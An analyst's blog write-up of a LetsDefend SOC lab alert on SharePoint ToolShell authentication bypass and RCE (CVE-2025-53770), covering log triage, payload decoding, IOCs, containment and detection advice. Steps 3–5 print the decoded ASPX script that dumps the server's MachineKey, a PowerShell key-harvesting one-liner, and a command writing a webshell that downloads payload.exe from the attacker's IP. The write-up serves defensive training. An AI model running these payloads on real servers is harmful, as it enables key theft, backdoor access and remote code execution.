---
layout: page
title: Letsdefend SOC342
description: SOC342
img: assets/img/download (2).png
importance: 3
category: THM/CTF/Write Up's
---
# Incident Write-Up: SharePoint ToolShell Auth Bypass & RCE (CVE-2025-53770)

**Author:** Kidd Gomez  
**Role:** SOC Analyst  
**Lab Platform:** LetsDefend.io  
**Alert ID:** SOC342  
**Severity:** Critical  
**Status:** Closed - True Positive  

---

## Incident Overview

| Parameter | Details |
| :--- | :--- |
| **Alert Name** | SOC342 - SharePoint ToolShell Auth Bypass and RCE |
| **CVE Identifier** | CVE-2025-53770 |
| **Impacted Asset** | Internal Web Server (Microsoft SharePoint) |
| **Target Application** | IIS / Microsoft SharePoint Server |
| **Attacker Activity** | Authentication Bypass & Arbitrary Command Execution |
| **Final Classification** | True Positive (Malicious Activity Confirmed) |

---
## 1. Pre-Investigation

<img src="https://github.com/user-attachments/assets/3e20d2c4-45bc-4dd9-8e48-ebbe7feb7241" alt="Pre-Investigation Triage" class="img-fluid rounded z-depth-1" style="margin: 1.5rem 0;" />


The first thing I did was make sure to note down in notepad of the source IP, Destination IP, Hostname, HTTP Request Method, and USER-Agent for future reference so I wouldn't have to keep going back to check.

## 2. Threat & Vulnerability Context

**CVE-2025-53770 (ToolShell)** is a critical vulnerability affecting Microsoft SharePoint instances. It permits an unauthenticated attacker to craft malicious HTTP requests that bypass built-in authentication filters and reach protected endpoints or trigger unsafe object deserialization.

Successful exploitation results in **Remote Code Execution (RCE)** executed directly under the context of the IIS worker process (`w3wp.exe`).

I Checked the NVD for CVE-2025-53770 so i could get a better understanding of the vulnerability that i was investigating.

<img src="https://github.com/user-attachments/assets/f239dbea-5067-4502-897d-c91542c9ece3" alt="NVD CVE-2025-53770 Context" class="img-fluid rounded z-depth-1" style="margin: 1.5rem 0;" />


---

## 3. Step-by-Step Investigation Workflow

### Step 1: Initial Alert Triage & Scope Definition
* **Alert Signal:** SIEM triggered a high-severity alert (`SOC342`) for an abnormal request sequence targeted at the internal SharePoint web application.
* **Objective:** Verify whether the incoming HTTP payload was successful and evaluate whether process creation events followed the web request.

### Step 2. Network & Web Server Log Analysis
* **Web Server / WAF Logs Analysis:**
  * After I checked network logs I, seen attacker IP (107.191.58.76) revealed HTTP traffic directed at SharePoint01:Request Type: HTTP POST  Target Endpoint: /_layouts/15/ToolPane.aspx?DisplayMode=Edit
  * Vulnerability Context (CVE-2025-53770):The combination of the POST payload to ToolPane.aspx along with the manipulated SignOut.aspx referer bypasses SharePoint's authentication checks (ToolShell flaw).  This grant allowed the remote attacker to drop ASPX files into the web root without authenticating.

<img src="https://github.com/user-attachments/assets/bf8e0b58-f133-4ee0-bd63-d785d6607872" alt="Process Behavioral Analysis" class="img-fluid rounded z-depth-1" style="max-width: 90%; display: block; margin: 1rem auto; box-shadow: 0 4px 15px rgba(0,0,0,0.2);" />

| Anomaly | Description |
|---------|-------------|
| **Spoofed Referer** | Set to `/layouts/SignOut.aspx` to appear to be real |
| **Payload size** | **7,699 bytes** of encoded data |
| **No Authentication Headers** | Exploiting a known bypass flaw |
 

  
### Step 3. Endpoint Behavioral Analysis & Payload Verification
Analyzing EDR/Endpoint process trees and command lines on `SharePoint01` confirmed remote command execution:

1. **Malicious Process Execution Chain:**
   * `w3wp.exe` -> `cmd.exe` -> `powershell.exe -EncodedCommand ...`
   * The IIS Worker process (`w3wp.exe`) spawned command interpreters—a classic signature of web server exploitation.
2. **Payload Extraction & CyberChef Decoding:**
   * Extracting and decoding the base64-encoded string from the PowerShell command revealed attempts to harvest the server's IIS `MachineKey` (`ValidationKey` and `DecryptionKey`).
   * The payload also generated an ASPX webshell (`spinstall0.aspx`) written directly to the `/_layouts/` directory to preserve backdoor access.
   
## Scripts in order

<img src="https://github.com/user-attachments/assets/82056b2a-c37e-45ac-907a-3d317f8901b6" alt="PowerShell Script Analysis 1" class="img-fluid rounded z-depth-1" style="margin: 1rem 0;" />

<img src="https://github.com/user-attachments/assets/f457b30c-50e1-481b-947a-6f46decf0f03" alt="Decoded CyberChef Output" class="img-fluid rounded z-depth-1" style="margin: 1rem 0;" />


After encoxded using cyberchef


<script runat="server" language="c#">
public void Page_load()
{
    var sy = System.Reflection.Assembly.Load("System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
    var mkt = sy.GetType("System.Web.Configuration.MachineKeySection");
    var gac = mkt.GetMethod("GetApplicationConfig", System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic);
    var cg = (System.Web.Configuration.MachineKeySection)gac.Invoke(null, new object[0]);
    Response.Write(cg.ValidationKey + "|" + cg.Validation + "|" + cg.DecryptionKey + "|" + cg.Decryption + "|" + cg.CompatibilityMode);
}
</script>



<img src="https://github.com/user-attachments/assets/2eef18bc-36cd-4b2d-a1b8-9cfb49402778" alt="PowerShell Script Analysis 2" class="img-fluid rounded z-depth-1" style="margin: 1rem 0;" />


### Step 4. MachineKey Extraction & Credential Harvesting

"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Command "[System.Web.Configuration.MachineKeySection]::GetApplicationConfig()"

In this final observed stage, the attacker executed a targeted PowerShell command to call the .NET GetApplicationConfig() method. This directly queried the server's core ASP.NET cryptographic configuration to harvest sensitive keys, including:

ValidationKey & DecryptionKey

Encryption mode & compatibility settings

Threat Impact
The extraction of these machine-level secrets represents a high-severity post-exploitation risk. With valid MachineKeys, an adversary can:

Forge Valid ViewState & Session Tokens: Craft custom ASP.NET ViewState payloads to achieve persistent, unauthenticated Remote Code Execution (RCE).

Bypass Authentication: Mint arbitrary identity tokens or cookies across SharePoint and any adjacent web applications sharing the same MachineKey configuration.

Decrypt Protected Data: Unmask sensitive application state and encrypted data stored in memory or cookies.

after that 

csc.exe /out:C:\Windows\Temp\payload.exe C:\Windows\Temp\payload.cs

cmd.exe /c echo <form runat=\"server\"> <object classid=\"clsid:ADB880A6-D8FF-11CF-9377-00AA003B7A11\"><param name=\"Command\" value=\"Redirect\"> <param name=\"Button\" value=\"Test\"> <param name=\"Url\" value=\"http://107.191.58.76/payload.exe\"></object></form>> > C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\spinstall0.aspx

   
## Step 5. Malicious ASPX Webshell (`spinstall0.aspx`)

The command reconstructed from EDR logs generated `spinstall0.aspx` directly in the SharePoint layout path:

1. **Web Shell Creation:** Writes a malicious ASPX file to `...\TEMPLATE\LAYOUTS\spinstall0.aspx`.
2. **Control Tag Embedding:** Injects an `<object>` ActiveX control configured with redirection parameters pointing to an external staging server (`http://107.191.58.76/payload.exe`).
3. **Trigger & Download:** Functions as a remote downloader, initiating external payload retrieval when accessed via a browser or invoked by local system tasks.

* To make sure APSX file is malicious we checked Virus Total and Threat Detection Tab.

<img src="https://github.com/user-attachments/assets/01f86581-e68d-4667-a9ab-5df46120bde6" alt="VirusTotal Detection Verification" class="img-fluid rounded z-depth-1" style="margin: 1rem 0;" />

<img src="https://github.com/user-attachments/assets/cf87961b-51fe-47eb-a6df-47f52b17c896" alt="LetsDefend Threat Detection Tab" class="img-fluid rounded z-depth-1" style="margin: 1rem 0;" />


---

## Step 6. Root Cause Analysis & Detection Findings

* **Root Cause:** An unpatched, network-accessible Microsoft SharePoint application vulnerable to **CVE-2025-53770**, which allowed authentication bypass and arbitrary code execution.
* **Key Indicators of Compromise (IOCs):**
  * **Parent Process:** `w3wp.exe` spawning command execution shells (`cmd.exe` / `powershell.exe`).
  * **Network Patterns:** HTTP requests targeting administrative or API endpoints with non-standard header fields yielding `HTTP 200`.

---

## Step 7. Containment, Eradication & Remediation

1. **Host Isolation:** Isolated the target SharePoint server from the internal network via EDR control to prevent lateral movement while keeping agent communication open for investigation.
2. **Process Termination & Artifact Cleanup:** Terminated active malicious `cmd.exe`/`powershell.exe` processes and removed any web shell files dropped on the host.
3. **Patch Management:** Applied Microsoft's security patch addressing **CVE-2025-53770**.
4. **Credential & Token Invalidation:** Reset credentials for the SharePoint service account (`AppPool`) and revoked active authentication tokens across the domain environment.

---

## Artifacts and Reporting

<img src="https://github.com/user-attachments/assets/a10c614d-1be8-4cb6-b51e-e07991bda0a3" alt="CyberChef Decoding & Payload Analysis" class="img-fluid rounded z-depth-1" style="max-width: 90%; display: block; margin: 1rem auto; box-shadow: 0 4px 15px rgba(0,0,0,0.2);" />
---

## Defensive Recommendations

* **Process Spawning Detection:** Deploy SIEM/EDR detection rules flagging any command shell process (`cmd.exe`, `powershell.exe`, `wmic.exe`) spawned by web server processes (`w3wp.exe`, `httpd`, `nginx`).
* **WAF Filtering:** Configure Web Application Firewall signatures to inspect and block malformed HTTP header combinations targeting SharePoint internal endpoints.
* **Least Privilege Enforcement:** Enforce strict service account privileges so web application pools lack rights to interact with host administrative utilities.

---


## Summary

Key Takeaways & Analyst Reflections
Investigating this incident provided valuable practical experience in analyzing complex post-exploitation behaviors associated with CVE-2025-53770. Deconstructing the attack chain—from initial HTTP authentication bypass to memory key extraction and web shell creation underscores the critical necessity of rapid patch management for public facing enterprise assets. Hands-on scenarios like this on platform tools like LetsDefend continue to sharpen my threat analysis, log reconstruction, and incident handling capabilities as I prepare for a SOC Analyst role.


<img src="https://github.com/user-attachments/assets/687dc006-2a6f-4078-89d1-036ad0d33158" alt="Email" class="img-fluid rounded z-depth-1" style="margin: 1rem 0;" /> />

